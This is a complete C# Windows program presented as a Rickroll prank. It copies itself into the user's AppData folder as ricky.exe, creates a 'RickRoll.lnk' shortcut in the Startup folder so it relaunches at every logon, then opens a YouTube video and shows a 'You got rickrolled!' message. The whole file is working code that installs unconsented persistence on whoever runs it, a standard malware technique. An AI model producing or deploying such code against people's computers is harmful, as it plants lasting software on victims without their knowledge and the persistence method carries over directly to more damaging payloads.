using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

class Program {
    [STAThread]
    static void Main() {
        string exePath = Application.ExecutablePath;

        // AppData folder for persistence
        string appDataFolder = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "YourFavStar"
        );
        Directory.CreateDirectory(appDataFolder);

        string destExe = Path.Combine(appDataFolder, "ricky.exe");

        // Copy itself if needed
        if (!File.Exists(destExe)) {
            File.Copy(exePath, destExe, true);
        }

        // Create shortcut in Startup
        string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string shortcut = Path.Combine(startupFolder, "RickRoll.lnk");

        if (!File.Exists(shortcut)) {
            ShortcutCreator.Create(shortcut, destExe, "Rickroll prank");
        }

        // Do the prank immediately
        Process.Start(new ProcessStartInfo {
            FileName = "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
            UseShellExecute = true
        });
        MessageBox.Show("You got rickrolled!");
    }
}

// --- ShortcutCreator helper ---
class ShortcutCreator
{
    [ComImport]
    [Guid("00021401-0000-0000-C000-000000000046")]
    private class ShellLink { }

    [ComImport]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("000214F9-0000-0000-C000-000000000046")]
    private interface IShellLink {
        void GetPath([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszFile,
            int cchMaxPath, ref IntPtr pfd, int fFlags);
        void GetIDList(ref IntPtr ppidl);
        void SetIDList(IntPtr pidl);
        void GetDescription([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszName,
            int cchMaxName);
        void SetDescription([MarshalAs(UnmanagedType.LPWStr)] string pszName);
        void GetWorkingDirectory([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszDir,
            int cchMaxPath);
        void SetWorkingDirectory([MarshalAs(UnmanagedType.LPWStr)] string pszDir);
        void GetArguments([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszArgs,
            int cchMaxPath);
        void SetArguments([MarshalAs(UnmanagedType.LPWStr)] string pszArgs);
        void GetHotkey(ref short pwHotkey);
        void SetHotkey(short wHotkey);
        void GetShowCmd(ref int piShowCmd);
        void SetShowCmd(int iShowCmd);
        void GetIconLocation([Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pszIconPath,
            int cchIconPath, ref int piIcon);
        void SetIconLocation([MarshalAs(UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
        void SetRelativePath([MarshalAs(UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
        void Resolve(IntPtr hwnd, int fFlags);
        void SetPath([MarshalAs(UnmanagedType.LPWStr)] string pszFile);
    }

    [ComImport]
    [Guid("0000010b-0000-0000-C000-000000000046")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IPersistFile {
        void GetClassID(out Guid pClassID);
        void IsDirty();
        void Load([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, uint dwMode);
        void Save([MarshalAs(UnmanagedType.LPWStr)] string pszFileName, bool fRemember);
        void SaveCompleted([MarshalAs(UnmanagedType.LPWStr)] string pszFileName);
        void GetCurFile([MarshalAs(UnmanagedType.LPWStr)] out string ppszFileName);
    }

    public static void Create(string shortcutPath, string targetPath, string description = "")
    {
        var link = (IShellLink)new ShellLink();
        link.SetDescription(description);
        link.SetPath(targetPath);

        var file = (IPersistFile)link;
        file.Save(shortcutPath, false);
    }
}
